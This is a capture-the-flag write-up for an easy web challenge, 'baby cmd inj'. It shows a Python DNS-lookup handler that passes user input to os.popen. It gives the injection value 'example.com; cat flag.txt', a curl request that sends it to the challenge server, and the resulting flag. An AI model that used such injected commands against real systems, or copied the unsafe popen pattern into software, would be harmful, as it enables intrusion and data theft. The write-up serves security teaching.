---
title: "baby cmd inj"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# baby cmd inj

## Summary

The DNS lookup input is passed to a shell command. A semicolon starts a second command that reads the flag.

## Root cause

The vulnerable command construction is:

~~~python
cmd = f"dig {domain}"
output = os.popen(cmd).read()
~~~

The submitted domain is concatenated into a shell command. The popen call invokes a shell, so a semicolon, pipe, or command substitution inside the domain is interpreted by the server. Supplying a list of arguments to a non-shell process would avoid this.

## Vulnerability

The normal lookup returns output from the server. Shell separators such as a semicolon change that output and allow another command to run, confirming command injection.

## Exploit

Submit this value as the domain:

~~~text
example.com; cat flag.txt
~~~

The semicolon ends the intended DNS lookup and starts a command to display flag.txt. The returned result includes the file contents.

~~~bash
curl -s -X POST https://baby-cmd-inj.web1.friendly-ctf.securinets.tn/dig \
  --data-urlencode 'domain=example.com; cat flag.txt'
~~~

## Flag

~~~text
Securinets{n3ver_tru5t_us3r_1nput_wh3n_1t_c0m3s_t0_ex3cut1ng_c0mm4nds}
~~~
